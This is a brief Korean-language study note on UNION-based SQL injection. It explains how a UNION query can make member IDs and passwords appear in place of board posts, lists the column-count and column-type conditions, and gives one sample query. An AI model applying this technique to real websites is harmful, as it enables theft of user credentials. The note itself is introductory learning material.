## UNION SQL Injection

(select ~~ ) union (select ~~~)

이걸 실행하면   
원래 게시글이 나와야 하는 곳에   
회원정보가 같이 딸려나올 수 있음.

지켜야 할 조건?   
1.앞에 있는 select 문과 뒤에 있는 select 문의 컬럼이 같아야 한다.
2.각 위치에 맞는 컬럼 타입이 맞아야 함   
id 문자열, pass 숫자열


select id,pass from member union select id,tittle from table   
앞의 select 문의 컬럼 2개 id,pass  
뒤의 select 문의 컬럼 2개 id,tittle
